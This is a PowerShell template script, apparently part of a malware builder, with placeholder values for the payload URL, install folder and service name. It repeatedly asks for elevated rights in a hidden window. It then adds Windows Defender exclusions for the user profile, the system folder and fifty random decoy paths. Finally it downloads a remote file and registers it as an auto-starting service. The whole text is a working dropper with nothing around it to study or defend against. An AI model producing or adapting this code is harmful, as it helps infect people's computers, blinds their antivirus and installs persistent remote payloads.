throw "KINESIN TEMPLATE SCRIPT";

if (Test-Path "<BUILDER_BASE_DIR>\<BUILDER_SERVICE_FILE_NAME>") {
    exit
}

function IsAdmin {
    $iden = [Security.Principal.WindowsIdentity]::GetCurrent()
    $prin = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $admin = [Security.Principal.WindowsBuiltInRole]::Administrator

    return $prin.IsInRole($admin)
}

$chars = 'qwertyuiopasdfghjklzxcvbnm'
function GenRandom {
    param (
        [int]$Length
    )

    -join ((1..$Length) | ForEach-Object { Get-Random -Minimum 0 -Maximum $chars.Length | ForEach-Object { $chars[$_] } })
}

if (-not (IsAdmin)) {
    try {
        throw ""
    } catch {
        while (-not $?) {
            try {
                Start-Process powershell.exe `
                    -Verb RunAs `
                    -WindowStyle Hidden `
                    -ArgumentList "-nop -ep Bypass -File `"$PSCommandPath`""

                exit
            } catch {
                Write-Error "" -ErrorAction SilentlyContinue
            }
        }
    }
}

Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath $env:SYSTEMROOT
Add-MpPreference -ExclusionPath "<BUILDER_BASE_DIR>"

for ($i = 1; $i -le 50; $i++) {
    $dir = GenRandom -Length 6;
    $sub = GenRandom -Length 7;

    Add-MpPreference -ExclusionPath "C:\$dir\$sub"
}

Invoke-WebRequest -Uri "<BUILDER_MAIN_FILE_URL>" -OutFile "<BUILDER_BASE_DIR>\<BUILDER_SERVICE_FILE_NAME>"

sc.exe create "<BUILDER_SERVICE_NAME>" binPath= "<BUILDER_BASE_DIR>\<BUILDER_SERVICE_FILE_NAME>" start= auto
sc.exe start "<BUILDER_SERVICE_NAME>"